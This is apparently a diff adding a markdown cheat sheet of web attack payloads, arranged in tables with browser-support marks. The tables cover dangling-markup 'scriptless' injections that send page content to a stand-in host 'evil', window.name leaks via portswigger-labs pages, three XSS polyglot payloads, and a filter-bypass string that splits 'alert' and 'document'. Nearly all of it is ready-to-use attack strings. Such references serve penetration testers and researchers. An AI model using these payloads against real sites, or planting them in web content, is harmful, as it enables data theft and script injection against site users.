@@ -1,0 +1,45 @@
+# Scriptless Attacks and Polyglot Payloads
+
+## Scriptless Attacks
+
+| **Attack Type** | **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-----------------|-------------|------------|-------------|------------|----------|
+| **Background Attribute** | `<body background="//evil? <table background="//evil? <table><thead background="//evil? <table><tbody background="//evil? <table><tfoot background="//evil? <table><td background="//evil? <table><th background="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Link href stylesheet** | `<link rel=stylesheet href="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Link href icon** | `<link rel=icon href="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Meta refresh** | `<meta http-equiv="refresh" content="0; http://evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Img src attribute** | `<img src="//evil? <image src="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Video using track element** | `<video><track default src="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Video using source element** | `<video><source src="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Audio using source element** | `<audio><source src="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Input src attribute** | `<input type=image src="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Button using formaction** | `<form><button style="width:100%;height:100%" type=submit formaction="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Input using formaction** | `<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Form using action** | `<button form=x style="width:100%;height:100%;"><form id=x action="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Object data attribute** | `<object data="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Iframe src attribute** | `<iframe src="//evil?` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Embed src attribute** | `<embed src="//evil?` | ❌ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Textarea and form target** | `<form><button formaction=//evil>XSS</button><textarea name=x>` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Window.name and form target** | `<button form=x>XSS</button><form id=x action=//evil target='` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Window.name and base target** | `<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Window.name and formtarget** | `<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Base href for data passing** | `<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Embed for window.name data** | `<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Iframe for window.name data** | `<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Object for window.name data** | `<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frame for window.name data** | `<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="` | ✔️ | ❌ | ✔️ | [Jump to the code](#) |
+| **Hidden input with image type** | `<input type=hidden type=image src="//evil?` | ❌ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## Polyglot Payloads
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Polyglot payload 1** | `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Polyglot payload 2** | `javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Polyglot payload 3** | `javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## WAF Bypass Using Global Objects
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **XSS into a JavaScript string** | `';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
